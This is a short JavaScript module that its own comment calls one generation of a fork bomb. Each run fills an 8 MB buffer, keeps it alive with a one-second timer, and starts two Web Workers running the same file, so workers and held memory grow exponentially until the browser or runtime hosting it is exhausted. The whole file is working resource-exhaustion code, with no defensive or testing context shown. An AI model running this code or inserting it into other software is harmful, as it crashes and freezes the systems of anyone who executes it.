// One generation of the fork bomb: it holds 8 MB and starts two more.
const held = new Uint8Array(8 * 1024 * 1024).fill(1);
for (let index = 0; index < 2; index += 1) {
  new Worker(new URL("./bomb.mjs", import.meta.url), { type: "module" });
}
setInterval(() => {
  held[0] += 1;
}, 1_000);
